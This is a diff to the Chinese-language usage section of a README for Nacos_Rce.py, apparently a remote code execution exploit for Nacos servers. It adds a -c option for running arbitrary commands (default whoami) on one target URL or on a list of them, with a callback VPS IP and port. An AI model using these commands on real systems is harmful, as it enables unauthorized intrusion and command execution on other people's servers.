@@ -22,14 +22,20 @@
 
 
 ### 2. 单url验证
-```python .\Nacos_Rce.py -t vps的ip地址 -p 5000 -u http://xxx.xxx.xxx```
+```python .\Nacos_Rce.py -t vps的ip地址 -p 5000 -u http://xxx.xxx.xxx -c whoami```
+
+**-c whoami 可以不写，默认为whoami,可以自定义命令**
+
 ![image](https://github.com/user-attachments/assets/17683bc9-5851-4222-9df7-6b71a8ddd591)
 ![image](https://github.com/user-attachments/assets/66c7cba3-489a-4bf4-876d-f2e375a82b44)
 
 
 
 ### 3. 多url验证
-```python .\Nacos_Rce.py -t vps的ip地址 -p 5000 -f ./url.txt```
+```python .\Nacos_Rce.py -t vps的ip地址 -p 5000 -f ./url.txt -c whoami```
+
+**-c whoami 可以不写，默认为whoami,可以自定义命令**
+
 ![image](https://github.com/user-attachments/assets/7eecdf9e-7c74-4115-afbc-5af9362f4db9)
 
 
